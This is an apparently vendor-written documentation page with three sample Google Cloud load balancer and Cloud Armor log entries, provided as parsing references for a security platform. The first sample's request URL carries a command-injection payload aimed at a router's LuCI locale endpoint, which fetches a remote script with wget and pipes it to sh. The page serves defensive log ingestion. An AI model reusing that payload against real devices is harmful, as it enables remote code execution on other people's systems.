
### Raw Events Samples

In this section, you will find examples of raw logs as generated natively by the source. These examples are provided to help integrators understand the data format before ingestion into Sekoia.io. It is crucial for setting up the correct parsing stages and ensuring that all relevant information is captured.


=== "accept_with_port"


    ```json
	{
        "httpRequest": {
            "latency": "0.001115s",
            "protocol": "HTTP/1.1",
            "remoteIp": "1.2.3.4:49194",
            "requestMethod": "GET",
            "requestSize": "201",
            "requestUrl": "http://5.6.7.8:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F1.1.1.1%3A88%2Ft%7Csh%3B%60)",
            "responseSize": "155",
            "status": 503,
            "userAgent": "Go-http-client/1.1"
        },
        "insertId": "1t7m3mbf14kc7c",
        "jsonPayload": {
            "@type": "type.googleapis.com/google.cloud.loadbalancing.type.LoadBalancerLogEntry",
            "backendTargetProjectNumber": "projects/111111111111",
            "enforcedSecurityPolicy": {
                "configuredAction": "THROTTLE",
                "name": "policy-name",
                "outcome": "ACCEPT",
                "priority": 2147483646,
                "rateLimitAction": {
                    "key": "1.2.3.4",
                    "outcome": "RATE_LIMIT_THRESHOLD_CONFORM"
                }
            },
            "proxyStatus": "error=\"destination_unavailable\"; details=\"failed_to_pick_backend\""
        },
        "logName": "projects/integration-gcloadbalancing/logs/loadbalancing.googleapis.com%2Fexternal_regional_requests",
        "receiveTimestamp": "2024-08-26T15:30:31.15568806Z",
        "resource": {
            "labels": {
                "backend_name": "",
                "backend_scope": "UNKNOWN",
                "backend_scope_type": "UNKNOWN",
                "backend_target_name": "backend-name",
                "backend_target_type": "BACKEND_SERVICE",
                "backend_type": "UNKNOWN",
                "forwarding_rule_name": "forwarding_rule-name",
                "matched_url_path_rule": "UNMATCHED",
                "network_name": "default",
                "project_id": "integration-gcloadbalancing",
                "region": "europe-west9",
                "target_proxy_name": "proxy-name",
                "url_map_name": "url_map-name"
            },
            "type": "http_external_regional_lb_rule"
        },
        "severity": "WARNING",
        "timestamp": "2024-08-26T15:30:27.62577Z"
    }
    ```



=== "accepted"


    ```json
	{
        "httpRequest": {
            "latency": "0.006023s",
            "remoteIp": "1.2.3.4",
            "requestMethod": "GET",
            "requestSize": "1012",
            "requestUrl": "https://example.org/api-services/api/ping",
            "responseSize": "307",
            "serverIp": "5.6.7.8",
            "status": 200,
            "userAgent": "Apache-HttpClient/5.2.1 (Java/21.0.1)"
        },
        "insertId": "1t7m3mbf14kc7c",
        "jsonPayload": {
            "@type": "type.googleapis.com/google.cloud.loadbalancing.type.LoadBalancerLogEntry",
            "backendTargetProjectNumber": "projects/12345678",
            "cacheDecision": [
                "RESPONSE_HAS_CONTENT_TYPE",
                "REQUEST_HAS_AUTHORIZATION",
                "CACHE_MODE_USE_ORIGIN_HEADERS"
            ],
            "enforcedSecurityPolicy": {
                "configuredAction": "ALLOW",
                "name": "cloud-armor-rule-policy-name-01",
                "outcome": "ACCEPT",
                "priority": 2147483647
            },
            "remoteIp": "1.2.3.4",
            "securityPolicyRequestData": {
                "remoteIpInfo": {
                    "regionCode": "BE"
                },
                "tlsJa3Fingerprint": "c691c8ec005d3a6a8aafc394edf6c1a3"
            },
            "statusDetails": "response_sent_by_backend"
        },
        "logName": "projects/google-project/logs/requests",
        "receiveTimestamp": "2024-02-20T15:03:01.755764847Z",
        "resource": {
            "labels": {
                "backend_service_name": "google-project-backend-03",
                "forwarding_rule_name": "google-project-ip-pub-03",
                "project_id": "google-project",
                "target_proxy_name": "google-project-lb-03-target-proxy",
                "url_map_name": "google-project-lb-03",
                "zone": "global"
            },
            "type": "http_load_balancer"
        },
        "severity": "INFO",
        "spanId": "74f69181f79f8236",
        "timestamp": "2024-02-20T15:03:00.867759Z",
        "trace": "projects/google-project/traces/ff592ffa0c72bac07e758a3851fd44f5"
    }
    ```



=== "denied"


    ```json
	{
        "insertId": "tyvh8vfi0k1di",
        "jsonPayload": {
            "remoteIp": "1.2.3.4",
            "backendTargetProjectNumber": "projects/123456789",
            "@type": "type.googleapis.com/google.cloud.loadbalancing.type.LoadBalancerLogEntry",
            "statusDetails": "denied_by_security_policy",
            "cacheDecision": [
                "RESPONSE_HAS_CONTENT_TYPE",
                "REQUEST_HAS_IF_NONE_MATCH",
                "CACHE_MODE_USE_ORIGIN_HEADERS"
            ],
            "enforcedSecurityPolicy": {
                "priority": 1000,
                "outcome": "DENY",
                "configuredAction": "DENY",
                "name": "block-all-http-requests"
            }
        },
        "httpRequest": {
            "requestMethod": "GET",
            "requestUrl": "http://malicious.site/url",
            "requestSize": "488",
            "status": 403,
            "responseSize": "258",
            "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "remoteIp": "1.2.3.4",
            "latency": "0.102957s"
        },
        "resource": {
            "type": "http_load_balancer",
            "labels": {
                "target_proxy_name": "http-lb-proxy",
                "project_id": "project_id",
                "zone": "global",
                "url_map_name": "http-load-balancer",
                "forwarding_rule_name": "http-content-rule",
                "backend_service_name": "backend-service"
            }
        },
        "timestamp": "2023-12-25T07:17:32.061039Z",
        "severity": "WARNING",
        "logName": "projects/project_id/logs/requests",
        "trace": "projects/project_id/traces/15dc480f7c7879c404b6b33843099866",
        "receiveTimestamp": "2023-12-25T07:17:33.457621996Z",
        "spanId": "25c549956d7c28e2"
    }
    ```



